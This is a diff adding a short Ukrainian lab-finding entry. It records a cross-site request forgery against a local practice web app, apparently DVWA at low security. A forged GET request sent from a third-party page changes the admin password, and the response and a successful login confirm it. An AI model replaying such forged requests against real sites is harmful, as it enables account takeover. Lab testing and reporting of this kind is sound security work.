@@ -1,0 +1,10 @@
+# V1. CSRF: зміна пароля адміністратора запитом зі стороннього сайту
+
+> GET http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=changed16&password_conf=changed16&Change=Change
+> Referer: http://localhost:8081/csrf.html
+> Cookie: security=low; PHPSESSID=bff0b12802bf323ec25e7905d071724a
+< HTTP 200
+< Date: Tue, 24 Nov 2026 03:30:44 GMT
+< body: Password Changed.
+
+Вхід з новим паролем після дії сторонньої сторінки: УСПІШНИЙ
